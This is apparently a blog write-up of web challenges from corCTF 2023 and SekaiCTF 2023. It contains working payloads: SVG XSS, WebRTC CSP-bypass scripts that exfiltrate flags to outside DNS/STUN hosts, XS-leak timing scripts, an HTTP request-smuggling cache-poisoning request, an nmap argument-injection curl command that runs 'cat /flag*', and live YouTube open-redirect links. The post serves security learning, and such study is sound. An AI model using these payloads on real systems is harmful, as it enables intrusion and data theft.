---
title: corCTF 2023 & Sekai CTF 2023 Writeup
catalog: true
date: 2023-09-02 14:10:44
tags: [Security]
categories: [Security]
photos: /img/corctf-sekaictf-2023-writeup/cover-en.png
---

I participated in both of these events to some extent, but I didn't look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail.

As usual, here are the keywords I noted:

1. GraphQL batch query + alias
2. Python os.path.join absolute path
3. Svg XSS, foreignObject
4. WebRTC CSP bypass
5. Status code xsleak
6. DNS rebinding
7. nmap command injection
8. Ruby rack file upload temporary storage
9. buildConstraintViolationWithTemplate EL injection
10. Request smuggling
11. document.baseURI
12. 200/404 status code xsleak

<!-- more -->

## corCTF 2023

The source code for the challenges is available here: [https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web](https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web)
Write-ups for some of the web challenges: [https://brycec.me/posts/corctf_2023_challenges](https://brycec.me/posts/corctf_2023_challenges)

### force (118 solves)

The PIN code has 10,000 possible values, and you need to find the correct value within 10 requests using a GraphQL query.

The solution is to use batch query + alias, which allows you to try multiple times within a single request (taken from the article below):

```
{
  flag0:flag(pin:0),
  flag1:flag(pin:1),
  flag2:flag(pin:2),
  flag3:flag(pin:3),
  flag4:flag(pin:4),
  flag5:flag(pin:5)
}
```

Write-ups by others:

1. [https://siunam321.github.io/ctf/corCTF-2023/web/force/](https://siunam321.github.io/ctf/corCTF-2023/web/force/)
2. [https://github.com/hanzotaz/corctf2023_writeup/](https://github.com/hanzotaz/corctf2023_writeup/)

### msfrognymize (64 solves)

The key is in this piece of code:

``` python
@app.route('/anonymized/<image_file>')
def serve_image(image_file):
    file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
    if ".." in file_path or not os.path.exists(file_path):
        return f"Image {file_path} cannot be found.", 404
    return send_file(file_path, mimetype='image/png')
```

Python's `os.path.join` has a well-known behavior where it ignores everything before the absolute path:

```
>>> os.path.join('/tmp/abc', 'test.txt')
'/tmp/abc/test.txt'
>>> os.path.join('/tmp/abc', '/test.txt')
'/test.txt'
```

Therefore, by leveraging this behavior, you can achieve arbitrary file reading and obtain the flag.

Reference: [https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/](https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/)

### frogshare (33 solves)

This challenge uses a library called [svg-loader](https://github.com/shubhamjain/svg-loader), which automatically loads an SVG URL. Therefore, this challenge is based on SVG XSS.

During the import, for security reasons, scripts and inline scripts are automatically removed, but `<foreignObject>` is overlooked. This tag allows you to load HTML inside an SVG, and it can be bypassed by using iframe srcdoc:

``` xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

  <foreignObject>
    <iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
  </foreignObject>
</svg>
```

Next, you need to bypass CSP. In this challenge, `<base>` is used to change the location of script loading.

References:
1. [https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/](https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/)

Renwa's solution involves rebuilding the app inside an iframe and inserting a script using Next.js features: [https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd](https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd)

### youdirect (5 solves)

This challenge is about finding an open redirect on YouTube.

@EhhThing provided a solution (clicking will log you out) that involves two layers of open redirect:

[https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394](https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394)

@pew provided:
https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew

@Josh provided:
https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&v=-5Rm9ymMTRA&html_redirect=1

This one is special. In fact, each link in the YouTube video description generates a redirect link, but they are bound to session IDs on the webpage. Therefore, if you switch devices, you cannot use them. However, this link was generated on the mobile app, which may be because the mobile app does not have cookies and is not restricted. Interesting.

### crabspace (4 solves)

The first step is to use tera's SSTI to leak environment variables: `{{ get_env(name="SECRET") }}`

Then, you can bypass CSP using WebRTC:

``` html
<script>
async function a(){
    c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]}
    (p=new RTCPeerConnection(c)).createDataChannel("d")
    await p.setLocalDescription()
}
a();
</script>
```

With these two steps, you can forge an admin session and obtain the flag.

References:
1. [corCTF 2023 web/crabspace Writeup](https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/)

### leakynote (3 solves)

This challenge was solved during the competition. In simple terms, it provides a free HTML injection and a strict CSP:

```
Content-Security-Policy "script-src 'none'; object-src 'none'; frame-ancestors 'none';";
```

There is also a search API that returns 200 for success and 404 for failure. The goal is to find a way to leak the flag using this API.

One of the key points of this challenge is that the CSP header is added by nginx, and nginx only adds the header for 2xx and 3xx responses. Therefore, if the search fails and returns 404, the page will not have a CSP.

So, I came up with a cache probing method.

We insert `<iframe src=search?q=a>` into the note. If nothing is found, there is no CSP, so the content of the iframe will be loaded, and the CSS on the page will also be loaded. On the other hand, because it violates the CSP, nothing will be loaded.

Therefore, we can use the "whether CSS is cached" point to determine if the search found anything.

At that time, the implemented code was as follows:

``` html
<script>
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
  async function clearCache() {
    let controller = new AbortController();
    let signal = controller.signal;
    fetch('https://leakynote.be.ax/assets/normalize.css',{
      mode: "no-cors",
      signal: signal,
      cache: 'reload'
    })
    await sleep(0)
    controller.abort();
    await sleep(100)
  }

  async function testNote(title, url) {
    // open note page
    var w = window.open(url)

    // wait 1s
    await sleep(1000)

    // clear cache and wait again
    await clearCache()
    await sleep(1500)

    // now the iframe should load, do cache probing
    const now = performance.now()
    await fetch('https://leakynote.be.ax/assets/normalize.css', {
      mode: 'no-cors',
      cache: 'force-cache'
    })
    const end = performance.now()
    fetch(`/report?title=${title}&ms=${end-now}`)
    if (end-now >= 4) {
      fetch('/maybe/' + title)
    }
    // cached(no result) => 2~3ms
    // no cache(found) => 4.8~5.8ms
    w.close()
  }

  // copy paste the following from python script
  async function main() {
    await testNote('{a','https://leakynote.be.ax/post.php?id=c9193aee91b0fc29')
await testNote('{c','https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2')
await testNote('{d','https://leakynote.be.ax/post.php?id=0c6caa61575b9478')
await testNote('{e','https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be')
await testNote('{f','https://leakynote.be.ax/post.php?id=71652df64d54c0e4')
await testNote('{g','https://leakynote.be.ax/post.php?id=354f3bec25e02332')
await testNote('{k','https://leakynote.be.ax/post.php?id=066aa475493e1a4c')
await testNote('{l','https://leakynote.be.ax/post.php?id=54a12f7b11098d2a')
await testNote('{o','https://leakynote.be.ax/post.php?id=621591145bcfc8e0')
await testNote('{r','https://leakynote.be.ax/post.php?id=6b44725cb5e274f0')
await testNote('{t','https://leakynote.be.ax/post.php?id=e025b26e5e7117a1')
await testNote('{y','https://leakynote.be.ax/post.php?id=f10001d89230485e')
await testNote('{z','https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad')
  }

  main()
</script>
```

After the competition, I saw two other interesting solutions. One of them leaks the information by loading fonts. When you do this:

``` css
@font-face {
    font-family: a;
    src: url(/time-before),url(/search.php?query=corctf{a),url(/search.php?query=corctf{a),... /*10000 times */,url(/time-after)
}
```

Chrome determines how to handle it based on the status code. If it is 200, it checks if it is a valid font. If it is 404, it fails directly. Therefore, you can use the loading time of the font to determine the status code.

ref: https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45

The other solution also utilizes the feature of whether the CSS file is loaded, but instead of using cache, it causes server-side busyness by opening a large number of pages at once and slows down the response time to determine.

ref: https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09

### pdf-pal (2 solves)

The nginx config for this challenge looks like this:

```
location / {
    proxy_pass http://localhost:7777;

    location ^~ /generate {
        allow 127.0.0.1;
        deny all;
    }

    location ^~ /rename {
        allow 127.0.0.1;
        deny all;
    }
}
```

So, theoretically, accessing the `/generate` path should not be possible. However, you can bypass it by exploiting the difference between gunicorn and nginx parsers:

```
POST /generate{chr(9)}HTTP/1.1/../../ HTTP/1.1
```

Related ticket: https://github.com/benoitc/gunicorn/issues/2530

After bypassing, you can use the `/generate` function to generate a PDF. However, because this service blocks some keywords, it is not possible to directly convert the flag into a PDF.

The solution is to use DNS rebinding to POST to `http://localhost:7778` and retrieve the response.

For example, if we have a domain `example.com` with two A records, one pointing to the actual IP and the other pointing to 0.0.0.0, when the admin bot visits `http://example.com:7778/`, it resolves the actual IP and successfully retrieves the page.

At this point, we shut down the server and execute `fetch('http://example.com:7778/generate')`. Since the original IP is no longer accessible, the browser will fallback to 0.0.0.0 and successfully send the request to the desired location. Because it is same-origin, we can also retrieve the response.

For more details, please refer to:
1. https://github.com/nccgroup/singularity
2. https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)

### lemon-csp (1 solve)

Found a CSP bypass for 0-day, no public solution available.

### 0day (1 solve)

This challenge involves finding a 1-day for VM2, no public solution available.

## SekaiCTF 2023

The source code for the challenges is available here: https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web

### Scanner Service (146 solves)

Input the port and host, and the following code will be executed:

``` ruby
nmap -p #{port} #{hostname}
```

However, the input data goes through a sanitizer with character restrictions.

Tabs can be used, so you can use tabs to add parameters. During the competition, `-iL /flag.txt -oN -` was used to pass the challenge, redirecting the output to stdout, or using `/dev/stdout` is also valid.

The official writeup suggests using the `http-fetch` script to download the file to the local machine, and then running `nmap --script` to execute that script:

```
--script http-fetch -Pn --script-args http-fetch.destination={DOWNLOAD_DIR},http-fetch.url={NSE_SCRIPT}
--script={DOWNLOAD_DIR}/{LHOST}/{LPORT}/{NSE_SCRIPT}
```

In Discord, @zeosutt provided an interesting alternative solution that utilizes the technique of uploaded files being stored in `/tmp/` on the rack server. You can directly import the uploaded file:

```
curl http://35.231.135.130:32190/ -F $'service=127.0.0.1:1337\t--script\t/tmp/RackMultipart?????????????????' -F '=os.execute("cat /flag*");filename=evil'
```

### Frog-WAF (29 solves)

There is an EL injection vulnerability in `buildConstraintViolationWithTemplate`, and the remaining challenge is to bypass the WAF.

Similar vulnerabilities have been found in actual products:

1. [Expression Language Injection in Netflix Conductor](https://github.com/advisories/GHSA-wfj5-2mqr-7jvv)
2. [CVE-2020-9296-Netflix-Conductor-RCE-Analysis](https://xz.aliyun.com/t/7889)

For the bypassing part, you can refer to the following resources:

1. https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py
2. https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba
3. https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00

### Chunky (16 solves)

This challenge involves a cache server and a backend server. All requests go through the cache server before reaching the backend, and a copy of the response is stored in the cache server as a cache. The goal is to poison the cache.

The solution is to construct a request that is interpreted differently by the cache server and the backend server, similar to request smuggling. Here is the solution provided by [zeyu](https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00):

```
GET /aaaaa HTTP/1.1
Host: localhost
transfer-encoding: chunked
Content-Length: 102

0

GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP/1.1
X: GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json HTTP/1.1
Host: localhost
```

The cache server interprets the second request as `GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json` based on the `Content-Length` header, while the backend server interprets it as `GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5` based on the `transfer-encoding` header. This way, we can use the response from another path to poison the jwks.json file and achieve cache poisoning.

### Golf Jail (16 solves)

I have solved this challenge, which took me about a day. I found it very interesting, and the code is concise.

``` php
<?php
    header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
    header("Cross-Origin-Opener-Policy: same-origin");

    $payload = "🚩🚩🚩";
    if (isset($_GET["xss"]) && is_string($_GET["xss"]) && strlen($_GET["xss"]) <= 30) {
        $payload = $_GET["xss"];
    }

    $flag = "SEKAI{test_flag}";
    if (isset($_COOKIE["flag"]) && is_string($_COOKIE["flag"])) {
        $flag = $_COOKIE["flag"];
    }
?>
<!DOCTYPE html>
<html>
    <body>
        <iframe
            sandbox="allow-scripts"
            srcdoc="<!-- <?php echo htmlspecialchars($flag) ?> --><div><?php echo htmlspecialchars($payload); ?></div>"
        ></iframe>
    </body>
</html>
```

You are given a 30-character free XSS payload, and the goal is to execute arbitrary code.

The clever part here is the use of `<iframe srcdoc>` with `sandbox=allow-scripts` to create an environment where code can be executed, but the origin is `null`, and the CSP (Content Security Policy) inherits the execution environment from the parent.

Therefore, you cannot access any information from the top, including `name` or `location`.

After searching around, I found `baseURI` in the `document`, which I discovered inherits the value from the parent and contains the complete path. So, by using `<svg/onload=eval("'"+baseURI)>` along with a hash, we can execute arbitrary code within the 30-character limit.

The reason we can use `baseURI` to access `document.baseURI` is that the scope of inline event handlers is automatically added to the document. I wrote about this in my blog post [Discovering My Lack of Front-end Knowledge through Cybersecurity](https://blog.huli.tw/2021/10/25/en/learn-frontend-from-security-pov/).

Once we have XSS, we can use `document.childNodes[0].nodeValue` to retrieve the flag. The final challenge is how to exfiltrate the flag. The CSP in this challenge is strict, and we cannot use redirects or `window.open` (the challenge blocks navigation without using the new `navigate-to` directive, it's impressive). So, we have to rely on some existing bypass techniques.

I first tried DNS prefetch, but it didn't work. I found out that Chrome released a feature called [Resoure Hint "Least Restrictive" CSP](https://chromestatus.com/feature/5553640629075968) in version 112, which might be the reason.

But no worries, WebRTC is still useful. However, I couldn't figure out how to use it even after trying for a long time. In the end, I found a payload in another team's write-up on [CTFtime](https://ctftime.org/writeup/37702) and combined it with DNS:

``` js
var flag = document.childNodes[0].nodeValue.trim()
    .replace("SEKAI{", "").replace("}", "")
    .split("").map(c => c.charCodeAt(0)).join(".");
var p = new RTCPeerConnection({
    iceServers: [{
        urls: "stun:" + flag + ".29e6037fd1.ipv6.1433.eu.org:1337"
    }]
});
p.createDataChannel("d");
p.setLocalDescription()
```

### Leakless Note (4 solves)

This is an advanced version of the previously mentioned "leakynote" challenge. This time, the CSP is stricter with the addition of `default-src 'self'`, and there are no other CSS files on the page.

The scenario is the same: there is an iframe that may or may not load, and the goal is to detect this.

The solution provided by strellic is as follows:

``` js
// leakless note oracle
const oracle = async (w, href) => {
    const runs = [];
    for (let i = 0; i < 8; i++) {
        const samples = [];
        for (let j = 0; j < 600; j++) {
            const b = new Uint8Array(1e6);
            const t = performance.now();
            w.frames[0].postMessage(b, "*", [b.buffer]);
            samples.push(performance.now() - t);
            delete b;
        }
        runs.push(samples.reduce((a,b)=>a+b, 0));
        w.location = href;
        await sleep(500); // rate limit
        await waitFor(w);
    }
    runs.sort((a,b) => a-b);
    return {
        median: median(runs.slice(2, -2)),
        sum: runs.slice(2, -2).reduce((a,b)=>a+b,0),
        runs
    }
}
```

When you send a large message to the iframe, the time it takes will be different.

Another team opened 1000 tabs and measured the network time. In hindsight, it seems quite reasonable. If the iframe has a status code of 200, it will generate a lot of requests, slowing down the network speed.
